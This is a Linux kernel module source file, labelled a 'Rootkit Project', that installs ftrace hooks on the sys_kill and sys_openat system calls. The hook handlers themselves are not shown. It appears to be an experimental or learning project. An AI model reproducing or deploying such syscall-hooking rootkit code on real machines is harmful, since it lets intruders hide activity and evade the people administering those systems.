#include "common.h"
#include "ftrace_helper.h"
#include "functions.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("James Walker");
MODULE_DESCRIPTION("Rootkit Project");
MODULE_VERSION("1.10");

struct ftrace_hook hooks[] = {
    HOOK("sys_kill", killHook, &killOG),
    HOOK("sys_openat", hookOpenAt, &ogOpenAt)
};

static int __init load(void) {
    int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "%p", &killOG);
    if (err) {
        printk(KERN_DEBUG "fh_install_hooks failed; %d\n", err);
        return err;
    }
    printk(KERN_INFO "Hello world!\n");
    return 0;
};

static void __exit unload(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Goodbye world!\n");
    return;
};

module_init(load);
module_exit(unload);
